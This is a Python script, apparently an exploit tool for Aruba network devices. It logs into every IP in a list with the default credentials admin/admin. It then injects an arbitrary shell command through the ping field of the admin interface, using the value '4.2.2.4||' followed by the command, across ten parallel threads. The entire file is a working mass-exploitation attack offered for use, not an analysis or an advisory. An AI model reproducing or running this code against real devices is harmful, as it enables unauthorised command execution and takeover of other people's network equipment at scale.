# Made By NRPE | Aruba 500 #
import concurrent.futures
import os
import requests
from functools import partial
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def send_da_hacks(ip, command):
    username = "admin"
    password = "admin"
    base_url = f"http://{ip}"
    
    login_payload = {
        "username": username,
        "password": password,
        "login": "Login"
    }
    
    login_headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": base_url,
        "Connection": "close"
    }
    
    session = requests.Session()
    
    # Login
    try:
        response = session.post(f"{base_url}/login.cgi", headers=login_headers, data=login_payload, verify=False, timeout=3)
        if response.status_code == 200 and "login failed" not in response.text.lower():
            logging.info(f"{ip} - Login successful")
        else:
            logging.warning(f"{ip} - Login failed: {response.status_code}")
            return False
    except requests.RequestException as e:
        logging.error(f"{ip} - Login error: {e}")
        return False
    
    # Command injection via ping
    ping_ip = f"4.2.2.4||{command}"
    
    data = {
        "ping_ip": ping_ip,
        "ping_timeout": "1",
        "textareai": "",
        "ping_start": "Ping"
    }
    
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": base_url,
        "Referer": f"{base_url}/admin.cgi?action=ping",
        "Connection": "close"
    }
    
    # Send exploit
    try:
        response = session.post(f"{base_url}/admin.cgi?action=ping", headers=headers, data=data, verify=False, timeout=3)
        if response.status_code == 200:
            logging.info(f"{ip} - Command sent")
            return True
        else:
            logging.warning(f"{ip} - Command failed: {response.status_code}")
            return False
    except requests.RequestException as e:
        logging.error(f"{ip} - Command error: {e}")
        return False

def main(ip_list, command):
    if not os.path.exists(ip_list):
        logging.error(f"File {ip_list} not found")
        return
    
    with open(ip_list, 'r') as file:
        ips = [line.strip() for line in file if line.strip()]
    
    if not ips:
        logging.warning("IP list is empty")
        return
    
    success_count = 0
    failure_count = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_da_hacks, ip, command): ip for ip in ips}
        for future in concurrent.futures.as_completed(futures):
            ip = futures[future]
            try:
                if future.result():
                    success_count += 1
                else:
                    failure_count += 1
            except Exception:
                failure_count += 1
    
    logging.info(f"Complete: {success_count} succeeded, {failure_count} failed")

if __name__ == "__main__":
    ip_list = "list.txt"
    command = "id"  # change this
    main(ip_list, command)   
